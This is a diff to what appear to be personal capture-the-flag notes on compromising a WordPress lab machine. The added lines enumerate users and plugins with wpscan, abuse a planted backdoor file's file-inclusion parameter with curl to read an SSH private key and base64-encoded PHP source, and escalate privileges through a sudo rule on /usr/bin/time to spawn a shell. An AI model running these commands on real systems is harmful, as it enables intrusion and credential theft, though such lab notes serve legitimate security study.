@@ -44,6 +44,10 @@ wpscan --url http://0.0.0.0/ -e u,p
 Password attack if username is known:
 wpscan --url http://0.0.0.0/ --usernames admin --passwords /usr/share/wordlist.txt
 
+wpscan -e u, p 	#p --> plugins, u --> usernames
+wpscan --url <> --plugins-detection mixed
+
+
 Backdoor scanning(needed tool: seclists ~500MB):
 gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Discovery/Web-Content/P-L-S/CommonBackdoor-PHP.fuzz.txt
 
@@ -52,10 +56,15 @@ wfuzz -u http://0.0.0.0/backdoor.php?FUZZ=/path/to/wherever
 
 Reading the backdoor file:
 curl http://0.0.0.0/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php
+curl http://redrocks.win/NetworkFileManagerPHP.php?key=/home/user/.ssh/id_rsa
+curl http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php
+echo 'asfadfd' | base64 -d
 
-had perm to run /usr/bin/time
+had perm to run /usr/bin/time as ippsec with NOPASSWD
 Switching user using that:
 sudo -u ippsec /usr/bin/time /bin/sh
+or
+sudo -u ippsec time sh
 
 
 }
